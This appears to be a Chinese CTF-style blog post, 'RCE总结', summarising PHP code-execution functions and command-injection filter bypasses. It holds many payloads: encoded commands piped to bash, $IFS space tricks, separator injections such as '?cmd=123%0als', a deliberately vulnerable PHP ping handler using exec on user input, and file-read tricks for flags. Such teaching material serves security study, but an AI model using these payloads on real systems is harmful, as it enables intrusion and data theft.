@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>RCE总结 | Welcome to C1yas0's Blog</title>
+  <meta name="author" content="C1yas0" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="RCE" />
+  
+  <meta name="description" content="一、RCE的定义RCE英文全称：remote command&#x2F;code execute分为远程命令执行ping和远程代码执行evel。漏洞出现的原因：没有在输入口做输入处理。我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE总结">
+<meta property="og:url" content="http://example.com/2021/07/14/RCE%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Welcome to C1yas0&#39;s Blog">
+<meta property="og:description" content="一、RCE的定义RCE英文全称：remote command&#x2F;code execute分为远程命令执行ping和远程代码执行evel。漏洞出现的原因：没有在输入口做输入处理。我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/07/14/RCE%E6%80%BB%E7%BB%93/https:/ae02.alicdn.com/kf/H0c5350f1552d4aafb8eeb3db48fa094aI.png">
+<meta property="article:published_time" content="2021-07-15T00:15:30.000Z">
+<meta property="article:modified_time" content="2021-07-29T08:15:57.907Z">
+<meta property="article:author" content="C1yas0">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/07/14/RCE%E6%80%BB%E7%BB%93/https:/ae02.alicdn.com/kf/H0c5350f1552d4aafb8eeb3db48fa094aI.png">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://github.com/Ciyaso">作者博客</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771?spm=1000.2115.3001.5343">CSDN</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Welcome to C1yas0&#39;s Blog</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Welcome to C1yas0&#39;s Blog</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <div class="kratos-post-content">
+            <h2 class="title-h2 text-center">RCE总结</h2>
+            <h2 id="一、RCE的定义"><a href="#一、RCE的定义" class="headerlink" title="一、RCE的定义"></a>一、RCE的定义</h2><p>RCE英文全称：remote command/code execute<br>分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。<br>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p>
+<h2 id="二、RCE利用函数"><a href="#二、RCE利用函数" class="headerlink" title="二、RCE利用函数"></a>二、RCE利用函数</h2><h3 id="1-代码注入"><a href="#1-代码注入" class="headerlink" title="1.代码注入"></a>1.代码注入</h3><h4 id="①eval"><a href="#①eval" class="headerlink" title="①eval()"></a>①eval()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval ( string $code ) : mixed</span><br></pre></td></tr></table></figure>
+
+<p>说明：eval()把字符串code 作为PHP代码执行。</p>
+<p><em>Caution函数eval()语言结构是非常危险的，因为它允许执行任意PHP代码。它这样用是很危险的。如果您仔细的确认过，除了使用此结构以外别无方法,请多加注意，不要允许传入任何由用户提供的、未经完整验证过的数据。</em></p>
+<p><strong>PS:传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。</strong><br>     <strong>return 语句会立即中止当前字符串的执行。</strong><br>    <strong>代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。</strong></p>
+<h4 id="②assert"><a href="#②assert" class="headerlink" title="②assert()"></a>②assert()</h4><h5 id="PHP-5"><a href="#PHP-5" class="headerlink" title="PHP 5"></a>PHP 5</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br></pre></td></tr></table></figure>
+
+<h5 id="PHP-7"><a href="#PHP-7" class="headerlink" title="PHP 7"></a>PHP 7</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [，Throwable $exception ] ) : bool</span><br></pre></td></tr></table></figure>
+
+<p>说明：assert()会检查指定的assertion并在结果为FALSE时采取适当的行动。</p>
+<p><em>Traditional assertions(PHP 5 and 7)</em><br><em>如果assertion是字符串，它将会被assert()当做PHP代码来执行。assertion是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含assertion表达式。这意味着如果你传入了boolean的条件作为assertion，这个条件将不会显示为断言函数的参数;在调用你定义的assert_options()处理函数时，条件会转换为字符串，而布尔值FALSE会被转换成空字符串。</em></p>
+<h4 id="③call-user-func-call-user-func-array"><a href="#③call-user-func-call-user-func-array" class="headerlink" title="③call_user_func()/call_user_func_array()"></a>③call_user_func()/call_user_func_array()</h4><p>(PHP 4,PHP 5, PHP 7)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [,mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure>
+
+<p>说明：call_user_func 一把第一个参数作为回调函数调用<br><em>第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。</em><br><em>可以传递任何内置函数或用户自定义函数，除了语言结构如array(),echo(),empty(),eval(),exit(),isset(),list(),print(),unset()</em></p>
+<h4 id="④create-function"><a href="#④create-function" class="headerlink" title="④create_function()"></a>④create_function()</h4><p>(PHP 4 &gt;= 4.0.1,PHP 5,PHP 7)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure>
+
+<p>说明：create_function()根据传递的参数创建匿名函数，并为其返回唯一的名称</p>
+<h4 id="⑤usort-uasort"><a href="#⑤usort-uasort" class="headerlink" title="⑤usort()/uasort()"></a>⑤usort()/uasort()</h4><p>(PHP 4,PHP 5, PHP 7)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort ( array 6$array , callable $value_compare_func ) : bool</span><br></pre></td></tr></table></figure>
+
+<p>说明：usort()使用用户自定义的比较函数对数组中的值进行排序</p>
+<p><em>本函数将用用户自定义的比较函数对一个数组中的值进行排序。如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</em></p>
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function my_sort($a,$b)</span><br><span class="line">&#123;</span><br><span class="line">if ($a==$b) return 0;</span><br><span class="line">   return ($a&lt;$b)?-1:1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=array(4,2,8,6);</span><br><span class="line">usort($a,&quot;my_sort&quot;);</span><br><span class="line"></span><br><span class="line">$arrlength=count($a);</span><br><span class="line">for($x=0;$x&lt;$arrlength;$x++)</span><br><span class="line">   &#123;</span><br><span class="line">   echo $a[$x];</span><br><span class="line">   echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br></pre></td></tr></table></figure>
+
+<h4 id="⑥ob-start"><a href="#⑥ob-start" class="headerlink" title="⑥ob_start()"></a>⑥ob_start()</h4><p>(PHP 4, PHP 5,PHP 7)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ob_start([ callback $output_callback [, int $chunk_size [, bool $erase ]]] ) : bool</span><br></pre></td></tr></table></figure>
+
+<p>说明：ob_start()打开输出控制缓冲</p>
+<p><em>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（(除http标头外)，相反需要输出的内容被存储在内部缓冲区中。</em><br><em>内部缓冲区的内容可以用ob_get_contents()函数复制到一个字符串变量中。想要输出存储在内部缓冲区中的内容，可以使用ob_end_flush()函数。另外，使用ob_end_clean()函数会静默丢弃掉缓冲区的内容。</em><br><strong>Warning 当有正在调用的回调函数时，一些网络服务器（例如Apache)会改变一个脚本的工作目录。你可以在</strong><br><strong>回调函数中再把它改回来，例如chdir(dirname($_SERVER[‘SCRIPT_FILENAME’]))。</strong><br>输出缓冲区是可堆叠的，这即意谓着，当有一个ob_start()是活跃的时，你可以调用另一个ob_start()。只要确保又正确调用了ob_end_flush()恰当的次数即可。如果有多重输出回调函数是活跃的，输出内容会一直按嵌套的顺序依次通过它们而被过滤。</p>
+<h4 id="⑦-php代码"><a href="#⑦-php代码" class="headerlink" title="⑦${php代码}"></a>⑦${php代码}</h4><p>${}可以将大括号内的PHP代码当作命令进行执行。</p>
+<h2 id="三、命令执行绕过"><a href="#三、命令执行绕过" class="headerlink" title="三、命令执行绕过"></a>三、命令执行绕过</h2><h3 id="1-过滤cat-flag等关键词"><a href="#1-过滤cat-flag等关键词" class="headerlink" title="1.过滤cat,flag等关键词"></a>1.过滤cat,flag等关键词</h3><h4 id="①代替"><a href="#①代替" class="headerlink" title="①代替"></a>①代替</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，可以查看</span><br><span class="line">vim:一种编辑器，可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag 2&gt;%261  //报错出文件内容</span><br></pre></td></tr></table></figure>
+
+<h4 id="②使用转义符"><a href="#②使用转义符" class="headerlink" title="②使用转义符"></a>②使用转义符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fl\ag</span><br><span class="line">cat fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
+
+<h4 id="③内联执行绕过"><a href="#③内联执行绕过" class="headerlink" title="③内联执行绕过"></a>③内联执行绕过</h4><p>拼接flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag.php;cat$IFS$a$b</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/c7011760c19f425eb1f92454af82c491.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a3c1f96de1dd4acfab042ab42eafa628.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3a28cb4c69f14123a507c931a635b27d.png" alt="在这里插入图片描述"></p>
+<h4 id="④变量绕过"><a href="#④变量绕过" class="headerlink" title="④变量绕过"></a>④变量绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=a;c=t;$a$b$c 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/1e1a45faabe34ad28d5eca0a5bd0a17f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f4f77de9738f484fa43cb612b08ac1c1.png" alt="在这里插入图片描述"></p>
+<h4 id="⑤编码进制绕过"><a href="#⑤编码进制绕过" class="headerlink" title="⑤编码进制绕过"></a>⑤编码进制绕过</h4><h6 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h6><p>Y2F0IDEudHh0 为 cat 1.txt的base64编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Y2F0IDEudHh0&quot;|base64 -d|bash  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/3f21031d88934c21a99a7ea22d0f87fb.png" alt="在这里插入图片描述"></p>
+<h6 id="16进制"><a href="#16进制" class="headerlink" title="16进制"></a>16进制</h6><p>0x636174202E2F312E747874 为 cat 1.txt的十六进制编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;0x636174202E2F312E747874&quot;|xxd -r -p|bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/fafd5a32d2ba45ffbfbd0350f12d5f0b.png" alt="在这里插入图片描述"></p>
+<p>\x63\x61\x74\x20\x2E\x2F\x31\x2E\x74\x78\x74 为 cat 1.txt的十六进制编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(printf &quot;\x63\x61\x74\x20\x2E\x2F\x31\x2E\x74\x78\x74&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/936bab1d35ff46df99571ffb502bb793.png" alt="在这里插入图片描述"></p>
+<h4 id="⑥过滤文件名绕过"><a href="#⑥过滤文件名绕过" class="headerlink" title="⑥过滤文件名绕过"></a>⑥过滤文件名绕过</h4><p><img src="https://img-blog.csdnimg.cn/e9c3b782169e4c1eadc9da38742d430f.png" alt="在这里插入图片描述"></p>
+<h6 id="1-利用正则匹配绕过"><a href="#1-利用正则匹配绕过" class="headerlink" title="1) 利用正则匹配绕过"></a>1) 利用正则匹配绕过</h6><p>例如：过滤/1010/flag.php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat 1010/flag.php</span><br><span class="line">cat ????/fla*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/f1c21f9355e94a5da3104075ce2630df.png"></p>
+<h6 id="2-利用未初始化变量，使用-u绕过"><a href="#2-利用未初始化变量，使用-u绕过" class="headerlink" title="2)利用未初始化变量，使用$u绕过"></a>2)利用未初始化变量，使用$u绕过</h6><p> 例如过滤/1010/flag.pgp中的1010</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 1010/flag.phpcat 1010$u/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/de858a77bb744ea78b21970ba11cbe09.png" alt="在这里插入图片描述"></p>
+<h4 id="⑦命令执行函数system-绕过"><a href="#⑦命令执行函数system-绕过" class="headerlink" title="⑦命令执行函数system()绕过"></a>⑦命令执行函数system()绕过</h4><p>system(“whoami”)</p>
+<h6 id="1-十六进制绕过"><a href="#1-十六进制绕过" class="headerlink" title="1)十六进制绕过"></a>1)十六进制绕过</h6><p>“\x73\x79\x73\x74\x65\x6d”(“whoami”);</p>
+<h6 id="2-括号绕过"><a href="#2-括号绕过" class="headerlink" title="2)括号绕过"></a>2)括号绕过</h6><p>(sy.(st).em)(whoami);</p>
+<h6 id="3-使用内敛执行代替system"><a href="#3-使用内敛执行代替system" class="headerlink" title="3)使用内敛执行代替system"></a>3)使用内敛执行代替system</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `ls`;echo $(ls);?&gt;&lt;?=`ls`;?&gt;&lt;?=$(ls);</span><br></pre></td></tr></table></figure>
+
+<h4 id="⑧使用-和-，-x-数字"><a href="#⑧使用-和-，-x-数字" class="headerlink" title="⑧使用$*和$@，$x,${数字}"></a>⑧使用$*和$@，$x,${数字}</h4><p>注：因为在没有传参的情况下，上面的特殊变量都是为空的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca$*t 1010/flag.phpca$@t 1010/flag.phpca$2t 1010/flag.phpca$&#123;39&#125;t 1010/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/69ccb5e93aec485a97b84026b846cb93.png" alt="在这里插入图片描述"></p>
+<h4 id="⑨其他读取文件方式"><a href="#⑨其他读取文件方式" class="headerlink" title="⑨其他读取文件方式"></a>⑨其他读取文件方式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl file:///root/1010/flag.phpstrings 1010/flag.phpuniq -c 1010/flag.phpbash -v 1010/flag.phprev 1010/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/a706822ba8c4428b8d69d2f698d6ed13.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="dir与ls的代替"><a href="#dir与ls的代替" class="headerlink" title="dir与ls的代替"></a>dir与ls的代替</h5><p>find 列出当前目录下的文件以及子目录所有文件<br><img src="https://img-blog.csdnimg.cn/d7772fcdaebf431dbac54f1f222e04d6.png" alt="在这里插入图片描述"></p>
+<h3 id="2-过滤空格"><a href="#2-过滤空格" class="headerlink" title="2.过滤空格"></a>2.过滤空格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09（url传递）(cat%09flag.php)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;&gt;（cat&lt;&gt;/flag）</span><br><span class="line">&lt;（cat&lt;/flag）</span><br><span class="line">&#123;cat,flag&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-过滤目录分隔符"><a href="#3-过滤目录分隔符" class="headerlink" title="3.过滤目录分隔符 (/)"></a>3.过滤目录分隔符 (/)</h3><p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$res = FALSE;</span><br><span class="line">if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; $_GET[&#x27;cmd&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/\//&quot;, $cmd, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$cmd&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>采用多个管道命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd flag;cat *</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-过滤分隔符-amp"><a href="#4-过滤分隔符-amp" class="headerlink" title="4.过滤分隔符 | &amp; ;"></a>4.过滤分隔符 | &amp; ;</h3><h4 id="①可以使用-0a代替，-0a其实在某种程度上是最标准的命令链接符号"><a href="#①可以使用-0a代替，-0a其实在某种程度上是最标准的命令链接符号" class="headerlink" title="①可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号"></a>①可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号</h4><table>
+<thead>
+<tr>
+<th align="center">功能</th>
+<th align="center">符号</th>
+<th align="center">payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">换行符</td>
+<td align="center">%0a</td>
+<td align="center">?cmd=123%0als</td>
+</tr>
+<tr>
+<td align="center">回车符</td>
+<td align="center">%0d</td>
+<td align="center">?cmd=123%0dls</td>
+</tr>
+<tr>
+<td align="center">连续指令</td>
+<td align="center">;</td>
+<td align="center">?1=123;pwd</td>
+</tr>
+<tr>
+<td align="center">后台进程</td>
+<td align="center">&amp;</td>
+<td align="center">?1=123&amp;pwd</td>
+</tr>
+<tr>
+<td align="center">管道</td>
+<td align="center">|</td>
+<td align="center">?1=123|pwd</td>
+</tr>
+<tr>
+<td align="center">逻辑运算</td>
+<td align="center">||或&amp;&amp;</td>
+<td align="center">?1=123&amp;&amp;pwd</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">符号</th>
+<th align="center">功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">；</td>
+<td align="center">分号</td>
+</tr>
+<tr>
+<td align="center">|</td>
+<td align="center">只执行后面那条命令</td>
+</tr>
+<tr>
+<td align="center">||</td>
+<td align="center">只执行前面那条命令</td>
+</tr>
+<tr>
+<td align="center">&amp;</td>
+<td align="center">两条命令都会执行</td>
+</tr>
+<tr>
+<td align="center">&amp;&amp;</td>
+<td align="center">两条命令都会执行</td>
+</tr>
+</tbody></table>
+<h4 id="②-gt-代替"><a href="#②-gt-代替" class="headerlink" title="②?&gt;代替;"></a>②?&gt;代替;</h4><p>在php中可以用?&gt;来代替最后一个;因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。</p>
+<h3 id="5-字符串长度受限"><a href="#5-字符串长度受限" class="headerlink" title="5.字符串长度受限"></a>5.字符串长度受限</h3><p>有事我们的命令长度可能受限，这时我们可以使用touch来生成文件，然后将生成的文件名拼凑成一句命令，最后执行，达到目的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;-- cat flag.php --&gt;</span><br><span class="line">替换：</span><br><span class="line">touch &quot;hp&quot;</span><br><span class="line">touch &quot;g.p\\&quot;</span><br><span class="line">touch &quot;la\\&quot;</span><br><span class="line">touch &quot;t f\\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t</span><br><span class="line">ls -t &gt;a 将 ls -t 内容写入到a文件中</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/088e67ead8fb4dc686023b04b66cbd15.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/3b5e77b40d5e4078b648d2de11b19999.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/88b89f4f1d75498c8f5fd6a316439653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="6-无回显"><a href="#6-无回显" class="headerlink" title="6.无回显"></a>6.无回显</h3><h4 id="①shell-exec等无回显函数。"><a href="#①shell-exec等无回显函数。" class="headerlink" title="①shell_exec等无回显函数。"></a>①shell_exec等无回显函数。</h4><h5 id="判断方法："><a href="#判断方法：" class="headerlink" title="判断方法："></a>判断方法：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls;sleep(3)</span><br></pre></td></tr></table></figure>
+
